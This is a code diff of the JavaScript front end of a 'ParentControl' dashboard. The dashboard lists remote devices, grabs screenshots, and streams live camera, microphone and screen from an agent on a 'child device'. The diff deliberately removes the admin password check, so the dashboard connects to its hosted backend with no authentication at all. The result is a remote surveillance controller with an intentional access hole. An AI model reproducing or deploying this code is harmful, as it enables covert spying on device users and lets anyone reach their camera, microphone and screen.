@@ -1,73 +1,37 @@
 // ═══════════════════════════════════════════════════════════════════
-// ParentControl Dashboard — app.js
+// ParentControl Dashboard — app.js (No Password Version)
 // ═══════════════════════════════════════════════════════════════════
 
-// ── CONFIG: Update this after deploying backend to Render ───────────
 const BACKEND_URL = 'https://parent-control-production.up.railway.app';
-const ADMIN_PASSWORD_KEY = 'pc_admin_pw';
 
-// ── State ────────────────────────────────────────────────────────────
 let socket = null;
-let devices = {};             // id -> device object
-let currentStreamId = null;  // deviceId being streamed
-let currentStreamType = null; // 'camera' or 'screen'
+let devices = {};             
+let currentStreamId   = null; 
+let currentStreamType = null; 
 let mpegtsPlayer = null;
 
-// ── On page load ──────────────────────────────────────────────────────
+// On page load - Auto connect directly
 window.addEventListener('DOMContentLoaded', () => {
-  // Auto-login with saved password
-  const saved = sessionStorage.getItem(ADMIN_PASSWORD_KEY);
-  if (saved) {
-    document.getElementById('pw-input').value = saved;
-    doLogin();
-  }
-  document.getElementById('pw-input').addEventListener('keydown', e => {
-    if (e.key === 'Enter') doLogin();
-  });
+  connectSocket();
 });
 
-// ── Login ─────────────────────────────────────────────────────────────
-function doLogin() {
-  const pw = document.getElementById('pw-input').value.trim();
-  document.getElementById('login-error').textContent = '';
-  document.getElementById('login-btn').textContent = 'Connecting…';
-  connectSocket(pw);
-}
-
-// ── Socket.IO Connection ──────────────────────────────────────────────
-function connectSocket(password) {
+// Socket.IO Connection without password auth
+function connectSocket() {
   if (socket) { socket.disconnect(); socket = null; }
 
-    socket = io(BACKEND_URL, {
-    auth: { password },
-    transports: ['polling', 'websocket'], // polling මුලට දැමීමෙන් connection එක block වෙන්නේ නැත
+  socket = io(BACKEND_URL, {
+    transports: ['polling', 'websocket'],
     reconnection: true,
     reconnectionAttempts: Infinity,
     reconnectionDelay: 2000,
     reconnectionDelayMax: 10000,
   });
 
-  // ── Connected ──────────────────────────────────────────────────────
   socket.on('connect', () => {
     setConnected(true);
-    sessionStorage.setItem(ADMIN_PASSWORD_KEY, password);
-    document.getElementById('login-overlay').style.display = 'none';
     document.getElementById('app').classList.remove('hidden');
     updateCmdDisplay();
     toast('Connected to server', 'success');
-    document.getElementById('login-btn').textContent = 'Access Dashboard';
-  });
-
-  // ── Auth failed ────────────────────────────────────────────────────
-  socket.on('connect_error', err => {
-    document.getElementById('login-btn').textContent = 'Access Dashboard';
-    setConnected(false);
-    if (err.message === 'auth_failed') {
-      document.getElementById('login-error').textContent = '❌ Wrong password';
-      sessionStorage.removeItem(ADMIN_PASSWORD_KEY);
-      document.getElementById('login-overlay').style.display = '';
-      document.getElementById('app').classList.add('hidden');
-    }
   });
 
   socket.on('disconnect', () => {
@@ -80,7 +44,6 @@ function connectSocket(password) {
     toast('Reconnected!', 'success');
   });
 
-  // ── Device events ──────────────────────────────────────────────────
   socket.on('device_list', list => {
     devices = {};
     document.getElementById('device-grid').innerHTML = '';
@@ -109,7 +72,6 @@ function connectSocket(password) {
     }
   });
 
-  // ── Media events ───────────────────────────────────────────────────
   socket.on('screenshot', ({ deviceId, data }) => {
     if (!devices[deviceId]) return;
     devices[deviceId].screenshot = data;
@@ -142,24 +104,15 @@ function connectSocket(password) {
   });
 }
 
-// ═══════════════════════════════════════════════════════════════════
-// Device Management
-// ═══════════════════════════════════════════════════════════════════
-
 function addOrUpdateDevice(d) {
   devices[d.id] = { ...d };
-
-  // Remove old card if exists
   const old = document.getElementById(`card-${d.id}`);
   if (old) old.remove();
 
   const grid = document.getElementById('device-grid');
   grid.appendChild(buildCard(d));
 
-  // If screenshot/photo was included in initial list
   if (d.screenshot) setPreview(d.id, d.screenshot, 'screenshot');
-
-  // Hide empty state, show grid
   document.getElementById('empty-state').classList.add('hidden');
   grid.classList.remove('hidden');
 }
@@ -250,10 +203,6 @@ function refreshCounts() {
   }
 }
 
-// ═══════════════════════════════════════════════════════════════════
-// Commands
-// ═══════════════════════════════════════════════════════════════════
-
 function cmd(deviceId, action) {
   if (!socket?.connected) { toast('Not connected', 'error'); return; }
   const d = devices[deviceId];
@@ -270,10 +219,6 @@ function cmd(deviceId, action) {
   toast(labels[action] || action, 'info');
 }
 
-// ═══════════════════════════════════════════════════════════════════
-// Live Stream
-// ═══════════════════════════════════════════════════════════════════
-
 function toggleStream(deviceId, type) {
   const isCamera = (type === 'camera');
   const myId = currentStreamId === deviceId && currentStreamType === type;
@@ -285,30 +230,25 @@ function startStream(deviceId, type = 'camera') {
   const d = devices[deviceId];
   if (!d?.online) { toast('Device offline', 'error'); return; }
 
-  // Stop any existing stream
   stopStream();
 
   currentStreamId   = deviceId;
   currentStreamType = type;
   const isCamera = (type === 'camera');
 
-  // Show modal
   const typeLabel = isCamera ? '🎥 Live Camera + Mic' : '🖥️ Live Screen';
   document.getElementById('live-title').textContent =
     `${typeLabel} — #${d.code} (${d.info?.hostname || ''})`;
   document.getElementById('live-modal').classList.remove('hidden');
   document.getElementById('stream-status').textContent = 'Connecting to device…';
 
-  // Mark button
   const btnId = isCamera ? `live-${deviceId}` : `screen-${deviceId}`;
   const btn = document.getElementById(btnId);
   if (btn) btn.classList.add('streaming');
 
-  // Send command to agent
   socket.emit('command', { deviceId, action: isCamera ? 'start_live' : 'start_screen' });
   toast(isCamera ? '🎥 Starting live camera…' : '🖥️ Starting live screen…', 'info');
 
-  // Setup mpegts.js player
   const videoEl = document.getElementById('live-video');
   if (mpegtsPlayer) { try { mpegtsPlayer.destroy(); } catch (_) {} mpegtsPlayer = null; }
 
@@ -331,7 +271,7 @@ function startStream(deviceId, type = 'camera') {
     mpegtsPlayer.on(mpegts.Events.ERROR, (type, detail) => {
       console.warn('mpegts error:', type, detail);
       document.getElementById('stream-status').textContent =
-        '⚠️ Stream error — check if ffmpeg is ready on child device (wait 2-3 min after first connect)';
+        '⚠️ Stream error — check if ffmpeg is ready on child device';
     });
 
     mpegtsPlayer.on(mpegts.Events.STATISTICS_INFO, () => {
@@ -339,7 +279,7 @@ function startStream(deviceId, type = 'camera') {
     });
   } else {
     document.getElementById('stream-status').textContent =
-      '⚠️ Browser does not support live MPEG-TS. Use Chrome or Edge.';
+      '⚠️ Browser does not support live MPEG-TS.';
   }
 }
 
@@ -347,7 +287,6 @@ function stopStream() {
   if (currentStreamId) {
     const action = (currentStreamType === 'screen') ? 'stop_screen' : 'stop_live';
     socket?.emit('command', { deviceId: currentStreamId, action });
-    // Clear both button states
     const liveBtn   = document.getElementById(`live-${currentStreamId}`);
     const screenBtn = document.getElementById(`screen-${currentStreamId}`);
     if (liveBtn)   liveBtn.classList.remove('streaming');
@@ -363,10 +302,6 @@ function stopStream() {
   document.getElementById('live-modal').classList.add('hidden');
 }
 
-// ═══════════════════════════════════════════════════════════════════
-// Screenshot Viewer
-// ═══════════════════════════════════════════════════════════════════
-
 function openScreenshot(deviceId) {
   const d = devices[deviceId];
   if (!d) return;
@@ -380,10 +315,6 @@ function openScreenshot(deviceId) {
     `${d.info?.hostname} • ${d.info?.ip} • ${new Date().toLocaleString()}`;
   document.getElementById('ss-modal').classList.remove('hidden');
 }
-
-// ═══════════════════════════════════════════════════════════════════
-// UI Helpers
-// ═══════════════════════════════════════════════════════════════════
 
 function closeModal(id) {
   document.getElementById(id).classList.add('hidden');
@@ -404,7 +335,7 @@ function copyCmd() {
   const text = document.getElementById('cmd-text').textContent;
   navigator.clipboard.writeText(text)
     .then(() => { toast('Command copied!', 'success'); })
-    .catch(() => { toast('Copy failed — select and copy manually', 'error'); });
+    .catch(() => { toast('Copy failed', 'error'); });
 }
 
 function fmtTime(ts) {
@@ -418,25 +349,18 @@ function esc(str) {
   return d.innerHTML;
 }
 
-// ═══════════════════════════════════════════════════════════════════
-// Toast Notifications
-// ═══════════════════════════════════════════════════════════════════
-
 function toast(msg, type = 'info') {
-  const icons = { success: '✅', error: '❌', info: 'ℹ️', warning: '⚠️' };
   const container = document.getElementById('toasts');
   const el = document.createElement('div');
   el.className = `toast ${type}`;
-  el.innerHTML = `<span>${icons[type] || ''}</span><span>${msg}</span>`;
+  el.innerHTML = `<span></span><span>${msg}</span>`;
   container.appendChild(el);
-
   setTimeout(() => {
     el.classList.add('out');
     el.addEventListener('animationend', () => el.remove(), { once: true });
   }, 4000);
 }
 
-// ── Keyboard shortcuts ────────────────────────────────────────────────
 document.addEventListener('keydown', e => {
   if (e.key === 'Escape') {
     closeModal('ss-modal');
